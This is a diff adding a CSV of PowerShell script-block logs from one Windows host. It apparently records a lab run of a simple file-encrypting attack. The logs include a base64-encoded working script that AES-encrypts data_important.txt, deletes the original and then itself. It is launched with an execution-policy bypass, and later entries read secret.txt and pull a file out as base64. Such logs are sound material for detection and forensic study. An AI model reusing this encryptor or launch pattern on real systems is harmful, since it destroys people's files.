+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:49.263+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:49.481+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:49.633+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:21:49.776+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:26:02.172+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:26:43.317+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:27:06.852+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:27:06.991+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:27:07.064+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:27:07.106+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:28:20.317+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","Rename-Item ""C:\Program Files\data_improtant.txt"" ""data_important.txt""
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+Rename-Item ""C:\Program Files\data_improtant.txt"" ""data_important.txt""
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-02T16:28:46.658+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat data_important.txt.aes
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat data_important.txt.aes
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:00:45.284+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:01:26.489+0000","1
+1","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","""C:\Windows\system32\whoami.exe""
+""C:\Windows\system32\whoami.exe""","null
+null"
+"2025-12-05T16:01:38.280+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat secret.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat secret.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:02:37.584+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:02:39.693+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:02:50.161+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files
+'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files
+'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:02:54.085+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:25.965+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-item 'C:\Program Files\data_important.txt').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-item 'C:\Program Files\data_important.txt').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:26.457+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-12-05T16:03:27.033+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
